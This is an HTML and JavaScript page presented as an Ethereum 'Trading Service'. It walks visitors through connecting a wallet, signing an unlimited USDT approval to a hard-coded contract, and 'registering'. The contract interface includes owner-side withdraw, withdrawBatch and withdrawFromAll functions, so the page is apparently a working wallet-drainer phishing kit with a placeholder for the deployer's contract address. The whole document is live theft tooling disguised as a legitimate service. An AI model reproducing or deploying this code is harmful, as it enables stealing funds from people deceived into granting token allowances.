<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trading Service - ETH</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }
        
        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 450px;
            width: 100%;
        }
        
        h1 {
            text-align: center;
            color: #1e293b;
            margin-bottom: 30px;
            font-size: 28px;
        }
        
        button {
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        
        button:hover {
            background: #2563eb;
        }
        
        button:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        .status.show {
            display: block;
        }
        
        .success {
            background: #d1fae5;
            color: #065f46;
            border: 2px solid #10b981;
        }
        
        .error {
            background: #fee2e2;
            color: #991b1b;
            border: 2px solid #ef4444;
        }
        
        .info {
            background: #dbeafe;
            color: #1e40af;
            border: 2px solid #3b82f6;
        }
        
        .address-box {
            background: #f8fafc;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            word-break: break-all;
            font-size: 13px;
            font-family: monospace;
            display: none;
        }
        
        .address-box.show {
            display: block;
        }
        
        .step {
            color: #64748b;
            font-size: 14px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéØ Trading Service</h1>
        
        <button id="connectBtn" onclick="connect()">
            1. Connect Wallet
        </button>
        
        <div id="addressBox" class="address-box">
            <strong>Connected:</strong><br>
            <span id="address"></span>
        </div>
        
        <button id="approveBtn" onclick="approveUSDT()" disabled>
            2. Approve USDT
        </button>
        <div class="step">Sign contract for unlimited USDT transfer</div>
        
        <button id="registerBtn" onclick="registerUser()" disabled>
            3. Register
        </button>
        <div class="step">Complete registration</div>
        
        <div id="status" class="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script>
        // ============================================
        // CONFIG - ETHEREUM NETWORK
        // ============================================
        
        const CONTRACT_ADDRESS = "0x754056BF0e16C2106C3ff7FB7c68475dBb21A004"; // ‚Üê PASTE YOUR ADDRESS
        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum USDT
        
        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTotalUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserInfo","outputs":[{"internalType":"bool","name":"registered","type":"bool"},{"internalType":"uint256","name":"currentBalance","type":"uint256"},{"internalType":"uint256","name":"withdrawn","type":"uint256"},{"internalType":"uint256","name":"allowance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getWithdrawnAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"totalWithdrawn","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"userList","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"withdrawBatch","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawFromAll","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
        
        const USDT_ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];

        let web3, account, contract, usdtContract;

        // ============================================
        // 1. CONNECT WALLET
        // ============================================
        
        async function connect() {
            try {
                if (!window.ethereum) {
                    showStatus('‚ùå No wallet found! Open in Trust Wallet Browser.', 'error');
                    return;
                }

                showStatus('Connecting...', 'info');

                web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                account = accounts[0];

                // Check network
                const chainId = await web3.eth.getChainId();
                if (chainId !== 1) {
                    showStatus('‚ö†Ô∏è Please switch to Ethereum Mainnet!', 'error');
                    return;
                }

                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

                document.getElementById('address').textContent = account;
                document.getElementById('addressBox').classList.add('show');
                document.getElementById('connectBtn').disabled = true;
                document.getElementById('approveBtn').disabled = false;

                showStatus('‚úÖ Connected! Now approve USDT.', 'success');
            } catch (error) {
                showStatus('‚ùå Connection failed: ' + error.message, 'error');
            }
        }

        // ============================================
        // 2. APPROVE USDT (UNLIMITED)
        // ============================================
        
        async function approveUSDT() {
            try {
                showStatus('‚è≥ Approving USDT... Check your wallet!', 'info');

                // Unlimited approval
                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                await usdtContract.methods
                    .approve(CONTRACT_ADDRESS, maxAmount)
                    .send({ from: account });

                document.getElementById('approveBtn').disabled = true;
                document.getElementById('registerBtn').disabled = false;

                showStatus('‚úÖ USDT Approved! Now register.', 'success');
            } catch (error) {
                showStatus('‚ùå Approval failed: ' + error.message, 'error');
            }
        }

        // ============================================
        // 3. REGISTER USER
        // ============================================
        
        async function registerUser() {
            try {
                showStatus('‚è≥ Registering... Check your wallet!', 'info');

                await contract.methods
                    .registerUser()
                    .send({ from: account });

                document.getElementById('registerBtn').disabled = true;

                showStatus('üéâ SUCCESS! You are registered! Check Etherscan: getTotalUsers() should show 1', 'success');
            } catch (error) {
                showStatus('‚ùå Registration failed: ' + error.message, 'error');
            }
        }

        // ============================================
        // HELPER
        // ============================================
        
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status show ${type}`;
        }
    </script>
</body>
</html>
